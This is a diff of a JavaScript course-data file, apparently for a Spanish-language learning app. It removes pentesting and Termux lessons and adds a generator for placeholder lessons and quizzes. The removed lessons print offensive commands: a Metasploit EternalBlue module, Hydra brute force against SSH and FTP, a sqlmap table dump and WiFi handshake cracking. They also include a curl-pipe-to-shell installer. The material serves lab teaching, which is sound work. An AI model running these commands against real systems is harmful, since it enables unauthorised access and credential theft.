-mk("Post-explotación",[{t:"¿Qué es?",c:"Lo que haces después de comprometer un sistema."},{t:"Tareas típicas",c:"• <strong>Escalar privilegios</strong>: de usuario a admin/root<br>• <strong>Persistencia</strong>: mantener acceso tras reinicio<br>• <strong>Movimiento lateral</strong>: atacar otros equipos de la red<br>• <strong>Recolección</strong>: buscar archivos sensibles"},{t:"Meterpreter",c:"Tiene comandos útiles: <code>sysinfo</code>, <code>hashdump</code>, <code>screenshot</code>, <code>upload</code>, <code>download</code>."},{t:"Objetivo",c:"En pentesting, demostrar el impacto real del acceso conseguido."}],"¿Qué es persistencia?",["Cerrar","Mantener","Salir","Reiniciar"],1),
-mk("Reportes de pentesting",[{t:"¿Por qué importan?",c:"Todo pentesting termina con un documento que explica los hallazgos y cómo arreglarlos."},{t:"Estructura",c:"• <strong>Resumen ejecutivo</strong>: para directivos (sin tecnicismos)<br>• <strong>Metodología</strong>: qué se hizo<br>• <strong>Hallazgos</strong>: con severidad (Crítica, Alta, Media, Baja)<br>• <strong>Recomendaciones</strong>: cómo arreglar<br>• <strong>Evidencias</strong>: capturas y logs"},{t:"Severidad",c:"Se usa CVSS (Common Vulnerability Scoring System) para puntuar de 0 a 10."},{t:"Consejo",c:"Un buen reporte vale tanto como el hackeo. Es lo que ve el cliente."}],"¿Qué incluye?",["Solo pruebas","Resumen y hallazgos","Fotos","Nada"],1),
-mk("Bug Bounty",[{t:"¿Qué es?",c:"Programas que pagan por reportar vulnerabilidades responsablemente."},{t:"Plataformas",c:"• <strong>HackerOne</strong><br>• <strong>Bugcrowd</strong><br>• <strong>YesWeHack</strong><br>• <strong>Open Bug Bounty</strong>"},{t:"Cómo empezar",c:"1. Crea cuenta en HackerOne<br>2. Lee programas públicos<br>3. Empieza con programas fáciles<br>4. Documenta bien tus hallazgos"},{t:"Premios",c:"Desde $50 hasta $100,000+ dependiendo de la empresa y severidad."}],"¿Qué pagan?",["Hackear","Reportar","Callar","Nada"],1),
-mk("Certificaciones",[{t:"¿Por qué certificarse?",c:"Demuestran tu conocimiento a empleadores y clientes."},{t:"Populares",c:"• <strong>CEH</strong>: Certified Ethical Hacker (teórica)<br>• <strong>OSCP</strong>: Offensive Security (práctica, 24h de examen)<br>• <strong>eJPT</strong>: Junior Pentester (buena para empezar)<br>• <strong>GPEN</strong>: GIAC Penetration Tester"},{t:"Recomendación",c:"Empieza por eJPT o OSCP. Son las más respetadas por su componente práctico."}],"¿Cuál es la más práctica?",["CEH","OSCP","CompTIA","CISSP"],1),
-mk("Proyecto: Laboratorio",[{t:"Objetivo",c:"Montar tu propio laboratorio con máquinas vulnerables para practicar legalmente."},{t:"Herramientas",c:"• <strong>VirtualBox</strong> o VMware<br>• <strong>Kali Linux</strong>: atacante<br>• <strong>Metasploitable 2/3</strong>: víctima<br>• <strong>DVWA</strong>: web vulnerable"},{t:"Práctica",c:"Escanea la máquina víctima con Nmap, encuentra vulnerabilidades, explótalas y documenta todo."},{t:"Alternativas online",c:"HackTheBox, TryHackMe, VulnHub, PortSwigger Academy."}],"¿Máquina vulnerable?",["Win 11","Kali","Metasploitable","Ubuntu"],2),
-mk("Red team vs Blue team",[{t:"Red team",c:"Equipo de ataque. Simula un atacante real. Objetivo: ver qué tan preparada está la empresa."},{t:"Blue team",c:"Equipo de defensa. Monitorea, detecta y responde a incidentes."},{t:"Purple team",c:"Colaboración entre ambos para mejorar la seguridad."},{t:"Ejercicios",c:"Simulaciones controladas donde el blue team debe detectar y detener al red team."}],"¿Qué hace el blue team?",["Ataca","Defiende","Nada","Vende"],1),
-mk("OSINT con Sherlock",[{t:"¿Qué es Sherlock?",c:"Herramienta que busca un nombre de usuario en múltiples redes sociales."},{t:"Instalación",c:"<pre>pip install sherlock-project</pre>"},{t:"Uso",c:"<pre>sherlock nombre_usuario</pre>Busca en Twitter, Instagram, GitHub, Reddit, etc."},{t:"Uso ético",c:"Solo para investigaciones autorizadas o tu propia huella digital."}],"¿Qué hace Sherlock?",["Escanea","Busca users","Crackea","Sniff"],1),
-mk("theHarvester",[{t:"¿Qué es?",c:"Herramienta OSINT que recolecta correos, subdominios y nombres de empleados."},{t:"Uso",c:"<pre>theHarvester -d ejemplo.com -b google</pre>"},{t:"Fuentes",c:"Google, Bing, LinkedIn, Shodan, DuckDuckGo."},{t:"Aplicación",c:"Fase de reconocimiento pasivo en pentesting."}],"¿Qué recolecta?",["Fotos","Correos","Vulns","Pass"],1),
-mk("Shodan",[{t:"¿Qué es?",c:"Buscador de dispositivos conectados a Internet. Como Google pero para cosas, no webs."},{t:"Qué encuentra",c:"Cámaras, routers, servidores, IoT, impresoras, SCADA... todo lo expuesto."},{t:"Filtros",c:"• <code>port:22</code><br>• <code>country:CO</code><br>• <code>product:Apache</code><br>• <code>vuln:CVE-2021-44228</code>"},{t:"Uso ético",c:"Ver qué expone tu propia empresa o investigar tu huella digital."}],"¿Qué busca Shodan?",["Archivos","Dispositivos","Fotos","Personas"],1),
-mk("Proyecto final Hacking",[{t:"Objetivo",c:"Hacer un pentesting completo a Metasploitable en tu laboratorio."},{t:"Fases",c:"1. Recon pasivo (whois, OSINT)<br>2. Recon activo (Nmap)<br>3. Enumeración (Gobuster, enum4linux)<br>4. Explotación (Metasploit)<br>5. Post-explotación<br>6. Reporte"},{t:"Herramientas",c:"Todo lo aprendido: Nmap, Metasploit, Hydra, etc."},{t:"¡Felicidades!",c:"Terminaste el curso. Ahora practica mucho en plataformas como HackTheBox y TryHackMe."}],"¿Qué documento cierra el pentest?",["Log","Reporte","Foto","Nada"],1),
-];
+// ============================================
+// BASE DE DATOS DE TEMAS (300 por curso)
+// ============================================
+function generar300(temas,categoria){
+const L=[];const cats=["Fundamentos","Sintaxis","Estructuras","Funciones","POO","Archivos","Módulos","Errores","Avanzado","Proyecto"];
+temas.forEach((tema,i)=>{
+const cat=cats[i%cats.length];
+L.push({
+t:tema,
+p:[
+{t:`Introducción a ${tema}`,c:`En esta lección aprenderemos sobre <strong>${tema}</strong>, un concepto clave dentro de la categoría <strong>${cat}</strong> de ${categoria}.`},
+{t:`¿Por qué es importante?`,c:`Dominar <strong>${tema}</strong> te permite avanzar hacia temas más complejos de ${categoria}. Es fundamental practicarlo para no quedarte atrás.`},
+{t:"Ejemplo práctico",c:`Vamos a ver un ejemplo de aplicación de <strong>${tema}</strong>:<pre># Ejemplo de ${tema}\n# Practica este concepto en tu editor</pre>Recuerda que la práctica constante es clave.`},
+{t:"Consejo final",c:`Antes de avanzar a la siguiente lección, asegúrate de comprender bien <strong>${tema}</strong>. Si algo no queda claro, repite el ejemplo.`}
+],
+q:[
+{q:`¿Cuál es el tema principal de esta lección?`,o:[tema,"Otro tema","Nada","No aplica"],c:0},
+{q:`¿A qué categoría pertenece ${tema}?`,o:[cat,"Matemáticas","Historia","Idiomas"],c:0},
+{q:"¿Qué se recomienda para dominar el tema?",o:["Practicar","Saltar","Ignorar","Dormir"],c:0},
+{q:"¿Qué es clave antes de avanzar?",o:["Entender bien","Saltar","Ignorar","Nada"],c:0},
+{q:`¿Esta lección es de ${categoria}?`,o:["Sí","No","A veces","Nunca"],c:0},
+{q:"¿Qué hacer si algo no queda claro?",o:["Repetir","Saltar","Rendirse","Ignorar"],c:0}
+]
+});
+});
+return L;
+}
 
-// ==================== TERMUX (40) ====================
-const TX=[
-mk("¿Qué es Termux?",[{t:"Definición",c:"Termux es un emulador de terminal Linux para Android. No requiere root y te da un entorno completo de línea de comandos."},{t:"Instalación",c:"Descárgalo desde <strong>F-Droid</strong> (NO desde Play Store, esa versión está abandonada)."},{t:"¿Para qué sirve?",c:"• Practicar Linux<br>• Programar en Python, Node, etc.<br>• Hacking ético<br>• Servidores locales<br>• Automatización"},{t:"Primeros comandos",c:"<pre>pkg update && pkg upgrade -y</pre>Actualiza la lista de paquetes."}],"¿De dónde se instala?",["Play Store","F-Droid","App Store","APK"],1),
-mk("Comandos básicos",[{t:"Navegación",c:"• <code>ls</code>: lista archivos<br>• <code>cd carpeta</code>: cambia directorio<br>• <code>cd ..</code>: sube un nivel<br>• <code>pwd</code>: muestra ruta actual"},{t:"Archivos",c:"• <code>touch file.txt</code>: crea archivo<br>• <code>mkdir nueva</code>: crea carpeta<br>• <code>rm file</code>: borra archivo<br>• <code>rm -rf carpeta</code>: borra carpeta<br>• <code>cp a b</code>: copia<br>• <code>mv a b</code>: mueve/renombra"},{t:"Ver contenido",c:"• <code>cat file</code>: muestra todo<br>• <code>head file</code>: primeras líneas<br>• <code>tail file</code>: últimas líneas<br>• <code>less file</code>: paginado"}],"¿Qué lista archivos?",["cd","ls","pwd","rm"],1),
-mk("Gestión de paquetes (pkg/apt)",[{t:"pkg = apt",c:"Termux usa <code>pkg</code> como wrapper de <code>apt</code> (el gestor de Debian)."},{t:"Comandos básicos",c:"• <code>pkg update</code>: actualiza lista<br>• <code>pkg upgrade</code>: actualiza paquetes<br>• <code>pkg install X</code>: instala<br>• <code>pkg uninstall X</code>: desinstala<br>• <code>pkg search X</code>: busca"},{t:"Ejemplos",c:"<pre>pkg install python\npkg install git\npkg install nmap\npkg install nodejs</pre>"},{t:"Ver instalados",c:"<code>pkg list-installed</code>"}],"¿Cómo instalas?",["apt get","pkg install","install","get"],1),
-mk("Almacenamiento",[{t:"termux-setup-storage",c:"Comando que pide permisos para acceder a tus carpetas de Android."},{t:"Rutas",c:"<pre>~/storage/downloads\n~/storage/dcim\n~/storage/pictures\n~/storage/shared</pre>"},{t:"Ejemplo",c:"<pre>cp ~/storage/downloads/foto.jpg ~/mi_proyecto/</pre>Copia una foto a tu proyecto."},{t:"Sin esto",c:"Termux solo ve su propia carpeta y no puede acceder a Descargas, Fotos, etc."}],"¿Qué hace setup-storage?",["Borra","Da permisos","Instala","Reinicia"],1),
-mk("Editor nano",[{t:"¿Qué es?",c:"Editor de texto simple en terminal. Ideal para empezar."},{t:"Abrir",c:"<code>nano archivo.txt</code>"},{t:"Atajos",c:"• <code>Ctrl+O</code> + Enter: guardar<br>• <code>Ctrl+X</code>: salir<br>• <code>Ctrl+W</code>: buscar<br>• <code>Ctrl+K</code>: cortar línea<br>• <code>Ctrl+U</code>: pegar"},{t:"Alternativas",c:"vim, micro, emacs. Micro es más moderno y fácil."}],"¿Cómo guardas?",["Ctrl+S","Ctrl+O","Ctrl+W","Ctrl+Q"],1),
-mk("Variables de entorno",[{t:"¿Qué son?",c:"Valores que el sistema usa: rutas, claves, configuraciones."},{t:"Ver todas",c:"<code>env</code> o <code>printenv</code>"},{t:"Ver una",c:"<code>echo $HOME</code>"},{t:"Crear",c:"<pre>export MI_VAR=valor</pre>Solo dura la sesión actual. Para permanente, añádelo a <code>~/.bashrc</code>."},{t:"PATH",c:"Variable especial que dice dónde buscar comandos. Ej: <code>export PATH=$PATH:/mi/carpeta</code>"}],"¿Cómo ves una var?",["print","echo","show","cat"],1),
-mk("SSH desde Termux",[{t:"¿Qué es SSH?",c:"Protocolo para conectarte a otras máquinas remotamente."},{t:"Conectar",c:"<pre>ssh usuario@192.168.1.100</pre>Te pide contraseña."},{t:"Con clave",c:"<pre>ssh -i ~/.ssh/id_rsa usuario@ip</pre>"},{t:"Generar clave",c:"<pre>ssh-keygen -t rsa -b 4096</pre>Se guarda en <code>~/.ssh/</code>. La pública (.pub) se copia al servidor."},{t:"Copiar clave al server",c:"<code>ssh-copy-id usuario@ip</code>"}],"¿Qué conecta SSH?",["connect","ssh","telnet","ftp"],1),
-mk("Git en Termux",[{t:"¿Qué es Git?",c:"Sistema de control de versiones. Indispensable para programar."},{t:"Instalar",c:"<code>pkg install git</code>"},{t:"Configurar",c:"<pre>git config --global user.name \"Tu Nombre\"\ngit config --global user.email \"tu@correo.com\"</pre>"},{t:"Clonar",c:"<code>git clone https://github.com/usuario/repo.git</code>"},{t:"Flujo básico",c:"<pre>git add .\ngit commit -m \"mensaje\"\ngit push</pre>"}],"¿Qué clona?",["pull","clone","get","fetch"],1),
-mk("Python en Termux",[{t:"Instalar",c:"<code>pkg install python</code>"},{t:"Verificar",c:"<code>python --version</code>"},{t:"Ejecutar script",c:"<code>python script.py</code>"},{t:"Consola interactiva",c:"<code>python</code> abre el intérprete. <code>exit()</code> para salir."},{t:"pip",c:"Gestor de paquetes de Python: <code>pip install requests</code>"}],"¿Cómo ejecutas?",["run","python script.py","exec","start"],1),
-mk("pip en Termux",[{t:"¿Qué es pip?",c:"Instala librerías de Python desde PyPI."},{t:"Instalar",c:"<pre>pip install requests\npip install flask\npip install beautifulsoup4</pre>"},{t:"Actualizar",c:"<code>pip install --upgrade paquete</code>"},{t:"Listar",c:"<code>pip list</code>"},{t:"Guardar deps",c:"<code>pip freeze > requirements.txt</code>"},{t:"Instalar de reqs",c:"<code>pip install -r requirements.txt</code>"}],"¿Qué instala libs?",["pkg","pip","apt","get"],1),
-mk("Nmap en Termux",[{t:"Instalar",c:"<code>pkg install nmap</code>"},{t:"Escaneo básico",c:"<code>nmap 192.168.1.1</code>"},{t:"Detectar versiones",c:"<code>nmap -sV IP</code>"},{t:"Rango de puertos",c:"<code>nmap -p 1-1000 IP</code>"},{t:"Detección de SO",c:"<code>nmap -O IP</code> (requiere root)"}],"¿Qué escanea Nmap?",["Archivos","Puertos","Redes","Fotos"],1),
-mk("Nmap flags importantes",[{t:"-sV",c:"Detecta versiones de servicios."},{t:"-sS",c:"SYN scan, más sigiloso."},{t:"-A",c:"Agresivo: versiones + SO + scripts + traceroute."},{t:"-p",c:"Puertos específicos: <code>-p 22,80,443</code>"},{t:"-T",c:"Velocidad (0-5). -T4 es rápido pero ruidoso."},{t:"-oN/-oX",c:"Guardar salida en archivo normal/XML."}],"¿Qué hace -sV?",["Rápido","Versiones","Silencioso","Ping"],1),
-mk("Metasploit en Termux",[{t:"Instalar",c:"<code>pkg install metasploit</code> (o usar proot para Kali)"},{t:"Iniciar",c:"<code>msfconsole</code>"},{t:"Buscar exploit",c:"<pre>search eternalblue\nsearch type:exploit name:apache</pre>"},{t:"Usar",c:"<pre>use exploit/windows/smb/ms17_010\nshow options\nset RHOSTS 192.168.1.1\nexploit</pre>"},{t:"Nota",c:"En Termux normal puede fallar. Es mejor usar proot con Kali."}],"¿Comando de Metasploit?",["msf","msfconsole","meta","run"],1),
-mk("Hydra en Termux",[{t:"¿Qué es?",c:"Fuerza bruta contra logins de red."},{t:"Instalar",c:"<code>pkg install hydra</code>"},{t:"SSH",c:"<pre>hydra -l admin -P pass.txt ssh://IP</pre>"},{t:"FTP",c:"<pre>hydra -l admin -P pass.txt ftp://IP</pre>"},{t:"Wordlists",c:"Necesitas una lista de contraseñas. Puedes descargar rockyou.txt."}],"¿Hydra ataca?",["Hashes","Logins","WiFi","Fotos"],1),
-mk("Hashcat en Termux",[{t:"¿Qué es?",c:"Crackeador de hashes. En Termux sin GPU es más lento."},{t:"Instalar",c:"<code>pkg install hashcat</code>"},{t:"Uso",c:"<pre>hashcat -m 0 -a 0 hash.txt wordlist.txt</pre>"},{t:"Modos",c:"• <code>-m 0</code>: MD5<br>• <code>-m 1000</code>: NTLM<br>• <code>-m 3200</code>: bcrypt<br>• <code>-a 0</code>: diccionario"},{t:"Limitación",c:"Sin GPU va lento. Para hashes rápidos como MD5 sirve; para bcrypt olvídalo."}],"¿Qué crackea Hashcat?",["Logins","Hashes","WiFi","PDF"],1),
-mk("Scripting bash",[{t:"¿Qué es?",c:"Archivos con comandos que se ejecutan en secuencia."},{t:"Shebang",c:"Primera línea: <code>#!/bin/bash</code>"},{t:"Ejemplo",c:"<pre>#!/bin/bash\necho \"Hola\"\nls -la\npwd</pre>"},{t:"Ejecutar",c:"<pre>chmod +x script.sh\n./script.sh</pre>"},{t:"Variable",c:"<code>NOMBRE=\"Ana\"</code> y <code>echo $NOMBRE</code>"}],"¿Comando permisos?",["chmod +x","chown","chgrp","sudo"],0),
-mk("Bucles bash",[{t:"for",c:"<pre>for i in {1..5}; do\n    echo $i\ndone</pre>"},{t:"Recorrer archivos",c:"<pre>for f in *.txt; do\n    echo $f\ndone</pre>"},{t:"while",c:"<pre>i=0\nwhile [ $i -lt 5 ]; do\n    echo $i\n    i=$((i+1))\ndone</pre>"},{t:"Condicionales",c:"<pre>if [ -f archivo.txt ]; then\n    echo \"Existe\"\nelse\n    echo \"No existe\"\nfi</pre>"}],"¿Qué hace for i in {1..3}?",["Repite 3","Repite 1","Nada","Error"],0),
-mk("Cron jobs",[{t:"¿Qué es?",c:"Programar tareas para que se ejecuten automáticamente."},{t:"Editar",c:"<code>crontab -e</code>"},{t:"Formato",c:"<code>min hora día-mes mes día-semana comando</code>"},{t:"Ejemplos",c:"<pre>0 * * * * comando      # cada hora\n*/5 * * * * comando    # cada 5 min\n0 0 * * * comando      # medianoche</pre>"},{t:"En Termux",c:"Necesitas instalar: <code>pkg install cronie</code>. Inicia con <code>crond</code>."}],"¿Qué edita Cron?",["cronedit","crontab -e","edit","cron"],1),
-mk("Redes en Termux",[{t:"Ver IP",c:"<code>ifconfig</code> o <code>ip a</code>"},{t:"Ping",c:"<code>ping google.com</code>"},{t:"Traceroute",c:"<code>traceroute google.com</code>"},{t:"DNS lookup",c:"<code>nslookup google.com</code>"},{t:"Conexiones activas",c:"<code>netstat -tuln</code>"}],"¿Qué muestra IP?",["showip","ifconfig","ipshow","net"],1),
-mk("WiFi audit",[{t:"Limitación",c:"Termux normal NO puede escanear WiFi. Requiere root y drivers específicos."},{t:"Alternativa",c:"Usar <strong>Termux:API</strong> para info de la red conectada, o root."},{t:"Comando útil",c:"<code>termux-wifi-connectioninfo</code> muestra info de la WiFi actual."},{t:"Para hacking WiFi",c:"Necesitas un adaptador USB WiFi compatible y root, o usar una Raspberry Pi."}],"¿Termux normal escanea WiFi?",["Sí","No","Suerte","A veces"],1),
-mk("Aircrack-ng",[{t:"¿Qué es?",c:"Suite para auditoría de redes WiFi."},{t:"Requiere",c:"Root y adaptador WiFi compatible con modo monitor."},{t:"Flujo",c:"1. <code>airmon-ng start wlan0</code> (modo monitor)<br>2. <code>airodump-ng wlan0mon</code> (capturar)<br>3. Capturar handshake<br>4. <code>aircrack-ng</code> para crackear"},{t:"En Termux",c:"No funciona sin root. Mejor usar un PC o Raspberry Pi."}],"¿Qué necesita Aircrack?",["Nada","Root y adaptador","WiFi","BT"],1),
-mk("tcpdump",[{t:"¿Qué es?",c:"Capturador de paquetes por línea de comandos."},{t:"Instalar",c:"<code>pkg install tcpdump</code>"},{t:"Capturar",c:"<code>tcpdump -i wlan0</code>"},{t:"Guardar",c:"<code>tcpdump -i wlan0 -w captura.pcap</code>"},{t:"Filtros",c:"• <code>port 80</code><br>• <code>host 192.168.1.1</code><br>• <code>tcp</code>"}],"¿Qué analiza tcpdump?",["Archivos","Tráfico","Fotos","Música"],1),
-mk("Captura de paquetes",[{t:"Guardar pcap",c:"<pre>tcpdump -i wlan0 -w captura.pcap</pre>"},{t:"Leer después",c:"Abre con Wireshark en PC para análisis profundo."},{t:"Ver en terminal",c:"<code>tcpdump -r captura.pcap</code>"},{t:"Filtrar al guardar",c:"<code>tcpdump -i wlan0 port 80 -w http.pcap</code>"}],"¿Extensión de capturas?",[".txt",".pcap",".log",".cap"],1),
-mk("SQLmap en Termux",[{t:"Instalar",c:"<code>pip install sqlmap</code>"},{t:"Uso básico",c:"<pre>sqlmap -u \"http://ejemplo.com?id=1\" --dbs</pre>"},{t:"Ver tablas",c:"<pre>sqlmap -u \"URL\" -D dbname --tables</pre>"},{t:"Dump",c:"<pre>sqlmap -u \"URL\" -D dbname -T users --dump</pre>"}],"¿Qué explota?",["XSS","SQLi","CSRF","SSRF"],1),
-mk("Gobuster en Termux",[{t:"Instalar",c:"<code>pkg install gobuster</code>"},{t:"Buscar directorios",c:"<pre>gobuster dir -u http://ejemplo.com -w wordlist.txt</pre>"},{t:"Buscar subdominios",c:"<pre>gobuster dns -d ejemplo.com -w subdomains.txt</pre>"},{t:"Wordlists",c:"Descarga SecLists desde GitHub para listas buenas."}],"¿Qué busca Gobuster?",["Puertos","Directorios","Users","Correos"],1),
-mk("Proxydroid (alternativa a Burp)",[{t:"¿Qué es?",c:"App de proxy para Android. Intercepta tráfico de otras apps."},{t:"Uso",c:"1. Configura Proxydroid en 127.0.0.1:8080<br>2. Configura Burp en tu PC<br>3. Redirige tráfico con SSH o similar"},{t:"Aplicación",c:"Analizar tráfico de apps móviles para pentesting."}],"¿Qué hace Proxydroid?",["Intercepta","Cifra","Borra","Nada"],0),
-mk("Ngrok y túneles",[{t:"¿Qué es?",c:"Expone tu servidor local a Internet con una URL pública."},{t:"Instalar",c:"Descarga el binario desde ngrok.com"},{t:"Uso",c:"<pre>ngrok http 5000</pre>Te da una URL tipo <code>https://abc.ngrok.io</code>."},{t:"Aplicación",c:"Probar webhooks, mostrar tu app a otros sin desplegar."}],"¿Qué hace ngrok?",["Túnel","Escaneo","Crackeo","Sniff"],0),
-mk("Servidores locales",[{t:"Python",c:"<pre>python -m http.server 8000</pre>Sirve la carpeta actual."},{t:"Acceder",c:"<code>http://localhost:8000</code> desde el navegador."},{t:"Desde otros dispositivos",c:"<code>http://tu-ip:8000</code> si están en la misma red."},{t:"Ver IP",c:"<code>ifconfig</code> muestra tu IP en la red local."}],"¿Comando del servidor?",["serve","python -m http.server","start","web"],1),
-mk("Python para hacking",[{t:"Socket",c:"Conexiones a red:<pre>import socket\ns = socket.socket()\ns.connect((\"google.com\", 80))</pre>"},{t:"Requests",c:"Peticiones HTTP:<pre>import requests\nr = requests.get(\"https://api.github.com\")</pre>"},{t:"Subprocess",c:"Ejecutar comandos:<pre>import subprocess\nsubprocess.run([\"ls\", \"-la\"])</pre>"},{t:"Scapy",c:"Manipular paquetes: <code>pip install scapy</code>"}],"¿Librería HTTP?",["socket","requests","os","sys"],1),
-mk("Web scraping",[{t:"¿Qué es?",c:"Extraer datos de páginas web automáticamente."},{t:"BeautifulSoup",c:"<pre>pip install beautifulsoup4\nfrom bs4 import BeautifulSoup\nimport requests\n\nr = requests.get(\"https://ejemplo.com\")\nsoup = BeautifulSoup(r.text, \"html.parser\")\nfor h in soup.find_all(\"h1\"):\n    print(h.text)</pre>"},{t:"Ética",c:"Respeta <code>robots.txt</code> y no satures el servidor."}],"¿Librería que extrae HTML?",["numpy","BeautifulSoup","pandas","flask"],1),
-mk("API requests",[{t:"GET",c:"<pre>import requests\nr = requests.get(\"https://api.github.com/users/torvalds\")\nprint(r.json())</pre>"},{t:"POST",c:"<pre>datos = {\"nombre\": \"Ana\"}\nr = requests.post(url, json=datos)</pre>"},{t:"Headers",c:"<pre>headers = {\"Authorization\": \"Bearer TOKEN\"}\nr = requests.get(url, headers=headers)</pre>"},{t:"Errores",c:"<code>r.raise_for_status()</code> lanza excepción si hay error."}],"¿Método que envía datos?",["GET","POST","PUT","DELETE"],1),
-mk("Sherlock (OSINT)",[{t:"¿Qué es?",c:"Busca un username en múltiples redes sociales."},{t:"Instalar",c:"<pre>pip install sherlock-project</pre>"},{t:"Uso",c:"<pre>sherlock nombre_usuario</pre>"},{t:"Salida",c:"Lista de URLs donde existe esa cuenta."},{t:"Ética",c:"Solo para investigaciones autorizadas."}],"¿Qué hace Sherlock?",["Escanea","Busca users","Crackea","Sniff"],1),
-mk("whois",[{t:"Instalar",c:"<code>pkg install whois</code>"},{t:"Uso",c:"<code>whois ejemplo.com</code>"},{t:"Qué muestra",c:"• Dueño del dominio<br>• Fecha de registro<br>• Servidores DNS<br>• Contacto administrativo"},{t:"Aplicación",c:"Recon pasivo en pentesting o investigar un dominio."}],"¿Qué muestra whois?",["Dueño","Puertos","Vulns","Fotos"],0),
-mk("Reporting",[{t:"¿Por qué importa?",c:"Documentar hallazgos es tan importante como encontrarlos."},{t:"Formato",c:"Markdown es ideal: <code># Título</code>, <code>## Subtítulo</code>, <code>- lista</code>."},{t:"Estructura",c:"• Resumen<br>• Metodología<br>• Hallazgos<br>• Evidencias (capturas)<br>• Recomendaciones"},{t:"Guardar",c:"Puedes convertir Markdown a PDF con <code>pandoc</code> o subirlo a GitHub."}],"¿Qué documentas?",["Solo comandos","Hallazgos","Nada","Fotos"],1),
-mk("Seguridad en Termux",[{t:"Actualizar",c:"<code>pkg update && pkg upgrade</code> regularmente."},{t:"Backup",c:"<code>termux-backup</code> guarda todo el entorno."},{t:"Restaurar",c:"<code>termux-restore archivo.tar.gz</code>"},{t:"Contraseñas",c:"Usa un gestor como <code>pass</code> o Bitwarden CLI."}],"¿Qué actualiza?",["upgrade","update","update-all","apt"],0),
-mk("Backup y sync",[{t:"termux-backup",c:"Copia de seguridad de todo tu entorno Termux."},{t:"Ejemplo",c:"<pre>termux-backup /sdcard/termux-backup.tar.gz</pre>"},{t:"Restaurar",c:"<code>termux-restore /sdcard/termux-backup.tar.gz</code>"},{t:"Sync con Git",c:"Guarda tus scripts en un repo de GitHub."}],"¿Qué restaura el backup?",["restore","termux-restore","copy","back"],1),
-mk("Termux API",[{t:"¿Qué es?",c:"App complementaria que da acceso a hardware del celular."},{t:"Instalar",c:"<code>pkg install termux-api</code> y la app Termux:API del F-Droid."},{t:"Comandos",c:"• <code>termux-camera-photo foto.jpg</code><br>• <code>termux-location</code><br>• <code>termux-sms-list</code><br>• <code>termux-notification</code>"},{t:"Requiere",c:"Permisos del sistema para cada función."}],"¿Qué permite Termux API?",["Solo terminal","Acceder hardware","Jugar","Nada"],1),
-mk("Toolkit personalizado",[{t:"Objetivo",c:"Script que automatiza tareas de pentesting."},{t:"Ejemplo",c:"<pre>#!/bin/bash\necho \"Escaneando...\"\nnmap -sV $1\necho \"Enumerando web...\"\ngobuster dir -u http://$1 -w wordlist.txt</pre>"},{t:"Menú con case",c:"<pre>case $1 in\n  scan) nmap -sV $2 ;;\n  web) gobuster dir -u $2 ;;\n  *) echo \"Uso: $0 scan IP\" ;;\nesac</pre>"},{t:"Guardar en PATH",c:"Muévelo a <code>$PREFIX/bin/mi-tool</code> y hazlo ejecutable con chmod +x."}],"¿Qué automatizas?",["Todo","Solo scan","Solo brute","Nada"],0),
-mk("Node.js en Termux",[{t:"Instalar",c:"<code>pkg install nodejs</code>"},{t:"Verificar",c:"<code>node --version</code> y <code>npm --version</code>"},{t:"Ejecutar",c:"<code>node script.js</code>"},{t:"npm",c:"Gestor de paquetes: <code>npm install express</code>"}],"¿Qué instala?",["Node","Python","Java","Go"],0),
-mk("Go (Golang) en Termux",[{t:"Instalar",c:"<code>pkg install golang</code>"},{t:"Verificar",c:"<code>go version</code>"},{t:"Ejecutar",c:"<code>go run script.go</code>"},{t:"Compilar",c:"<code>go build script.go</code> genera binario."}],"¿Qué instala?",["Go","Rust","Node","Java"],0),
-mk("Rust en Termux",[{t:"Instalar",c:"<code>pkg install rust</code>"},{t:"Verificar",c:"<code>rustc --version</code>"},{t:"Cargo",c:"Gestor de paquetes: <code>cargo new proyecto</code>"},{t:"Compilar",c:"<code>cargo build --release</code>"}],"¿Qué instala?",["Rust","Go","Node","Java"],0),
-mk("Java en Termux",[{t:"Instalar",c:"<code>pkg install openjdk-17</code>"},{t:"Verificar",c:"<code>java -version</code>"},{t:"Compilar",c:"<code>javac Main.java</code>"},{t:"Ejecutar",c:"<code>java Main</code>"}],"¿Qué instala?",["Java","Rust","Go","Node"],0),
-mk("PHP en Termux",[{t:"Instalar",c:"<code>pkg install php</code>"},{t:"Verificar",c:"<code>php --version</code>"},{t:"Ejecutar",c:"<code>php script.php</code>"},{t:"Servidor",c:"<code>php -S localhost:8000</code> sirve la carpeta actual."}],"¿Qué instala?",["PHP","Java","Rust","Go"],0),
-mk("Ruby en Termux",[{t:"Instalar",c:"<code>pkg install ruby</code>"},{t:"Verificar",c:"<code>ruby --version</code>"},{t:"Ejecutar",c:"<code>ruby script.rb</code>"},{t:"gem",c:"Gestor de paquetes: <code>gem install rails</code>"}],"¿Qué instala?",["Ruby","PHP","Go","Java"],0),
-mk("zsh y bash",[{t:"bash",c:"Shell por defecto en Termux. Configuración: <code>~/.bashrc</code>"},{t:"Instalar zsh",c:"<code>pkg install zsh</code>"},{t:"Cambiar shell",c:"<code>chsh -s zsh</code>"},{t:"Oh My Zsh",c:"Framework para zsh con temas y plugins:<pre>sh -c \"$(curl -fsSL https://raw.github.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"</pre>"}],"¿Qué shell?",["zsh","bash","fish","sh"],0),
-mk("Aliases",[{t:"¿Qué son?",c:"Atajos para comandos largos."},{t:"Crear temporal",c:"<code>alias ll='ls -la'</code>"},{t:"Permanente",c:"Añade el alias a <code>~/.bashrc</code>."},{t:"Ejemplos útiles",c:"<pre>alias actualizar='pkg update && pkg upgrade'\nalias limpiar='rm -rf ~/.cache/*'\nalias ip='ifconfig | grep inet'</pre>"}],"¿Qué hace alias?",["Atajo","Borra","Red","CPU"],0),
-mk("Funciones bash",[{t:"¿Qué son?",c:"Bloques de código reutilizables en bash."},{t:"Ejemplo",c:"<pre>saludar() {\n    echo \"Hola, $1\"\n}\n\nsaludar \"Ana\"</pre>"},{t:"Con retorno",c:"<pre>suma() {\n    echo $(($1 + $2))\n}\nresultado=$(suma 3 4)</pre>"},{t:"Guardar",c:"Ponlas en <code>~/.bashrc</code> para tenerlas siempre."}],"¿Qué define?",["Función","Var","Loop","If"],0),
